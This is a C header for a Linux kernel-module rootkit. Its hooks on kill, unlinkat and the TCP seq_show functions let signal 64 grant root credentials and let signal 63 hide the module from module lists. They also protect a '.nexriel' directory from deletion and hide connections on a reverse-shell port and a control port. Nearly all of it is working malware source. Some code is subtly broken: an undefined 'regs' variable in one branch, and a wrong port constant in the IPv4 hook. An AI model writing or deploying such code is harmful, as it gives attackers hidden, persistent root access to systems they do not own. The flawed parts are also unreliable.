#ifndef HOOKS_H
#define HOOKS_H

#pragma once
#include <linux/kallsyms.h>
//
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/version.h>

#define REV_SHELL_PORT 1339
#define COMM_PORT 1337
#define MAGIC_DIR ".nexriel"
#define PATH_BUF_LEN 256
#ifdef CONFIG_X86_64
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 17, 0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;

static ptregs_t orig_unlinkat;

#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
static orig_kill_t orig_kill;

typedef asmlinkage long (*orig_unlinkat_t)(int dfd, const char __user *pathname,
                                           int flags);
static orig_unlinkat_t orig_unlinkat;
#endif
#endif

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

enum SIGS {
  SIGINVIS = 63, // hide procces kill 63 1
  SIGROOT = 64,  // spawn root shell kill 64 1
};

static struct list_head *prev_module;
static struct list_head *prev_kobj;
static short hidden = 0;

void root(void);
void root(void) {
  struct cred *creds;
  creds = prepare_creds();
  if (creds == NULL) {
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

static inline void hide_module(void) {
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);

  prev_kobj = THIS_MODULE->mkobj.kobj.entry.prev;
  list_del(&THIS_MODULE->mkobj.kobj.entry);
  hidden = 1;
  printk(KERN_INFO "Hiding LKM\n");
}

static inline void show_module(void) {
  list_add(&THIS_MODULE->list, prev_module);
  list_add(&THIS_MODULE->mkobj.kobj.entry, prev_kobj);
  hidden = 0;
  printk(KERN_INFO "Unhiding LKM\n");
}

#if PTREGS_SYSCALL_STUB
static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
  int sig = regs->si;

  switch (sig) {
  case SIGINVIS:
    if (hidden)
      show_module();
    else
      hide_module();
    break;
  case SIGROOT:
    root();
    break;
  default:
    return orig_kill(regs);
  }
  return 0;
}

static notrace asmlinkage long hook_unlinkat(const struct pt_regs *regs) {
  long copied;
  char *buff = kmalloc(PATH_BUF_LEN, GFP_KERNEL);
  if (buff == NULL) {
    printk(KERN_INFO "Failed to allocate memory for receive buffer\n");
    return -ENOMEM;
  }

  char __user *pathname = (char *)regs->si;

  if (pathname) {
    copied = strncpy_from_user(buff, pathname, PATH_BUF_LEN);
    if (copied <= 0) {
      buff[0] = '\0';
    } else {
      buff[PATH_BUF_LEN - 1] = '\0';
    }
  } else {
    buff[0] = '\0';
  }

  if (strncmp(buff, MAGIC_DIR, strlen(MAGIC_DIR)) == 0) {
    return -EPERM;
  }

  return orig_unlinkat(regs);
}
#else

static notrace asmlinkage long
hook_unlinkat(int dfd, const char __user *pathname, int flags) {
  long copied;
  char *buff = kmalloc(PATH_BUF_LEN, GFP_KERNEL);
  if (buff == NULL) {
    printk(KERN_INFO "Failed to allocate memory for receive buffer\n");
    return -ENOMEM;
  }

  if (pathname) {
    copied = strncpy_from_user(buff, pathname, PATH_BUF_LEN);
    if (copied <= 0) {
      buff[0] = '\0';
    } else {
      buff[PATH_BUF_LEN - 1] = '\0';
    }
  } else {
    buff[0] = '\0';
  }

  if (strncmp(buff, MAGIC_DIR, strlen(MAGIC_DIR)) == 0) {
    return -EPERM;
  }

  return orig_unlinkat(dfd, pathname, flags);
}

static notrace asmlinkage long hook_kill(pid_t pid, int sig) {
  switch (sig) {
  case SIGINVIS:
    if (hidden)
      show_module();
    else
      hide_module();
    break;
  case SIGROOT:
    root();
    break;
  default:
    return orig_kill(regs);
  }
  return 0;
}
#endif

static notrace asmlinkage long hook_tcp6(struct seq_file *seq, void *v) {
  struct inet_sock *sock;
  unsigned short communication_port = htons(COMM_PORT);

  if (v != SEQ_START_TOKEN) {
    sock = (struct inet_sock *)v;
    if (communication_port == sock->inet_sport ||
        communication_port == sock->inet_dport) {
      return 0;
    }
  }
  return orig_tcp6_seq_show(seq, v);
}

static notrace asmlinkage long hook_tcp4(struct seq_file *seq, void *v) {
  struct inet_sock *sock;
  unsigned short communication_port = htons(REV_SHELL_PORT);
  unsigned short revshell_port = htons(REV_SHELL_PORT);

  if (v != SEQ_START_TOKEN) {
    sock = (struct inet_sock *)v;
    if (communication_port == sock->inet_sport ||
        communication_port == sock->inet_dport ||
        revshell_port == sock->inet_sport ||
        revshell_port == sock->inet_dport) {
      return 0;
    }
  }
  return orig_tcp4_seq_show(seq, v);
}
#endif
